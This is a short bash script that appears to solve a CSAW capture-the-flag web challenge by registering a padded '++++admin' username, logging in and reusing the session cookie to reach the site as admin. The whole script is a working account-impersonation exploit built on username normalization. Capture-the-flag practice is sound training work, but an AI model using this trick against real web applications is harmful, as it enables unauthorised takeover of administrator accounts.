#!/bin/bash
curl web.red.csaw.io:5002/register --data 'username=++++admin&password=px'
curl web.red.csaw.io:5002/login --data 'username=++++admin&password=px' -c -

read varname

echo "session=$varname"

curl -X GET  web.red.csaw.io:5002/ --cookie "session=$varname" -c -
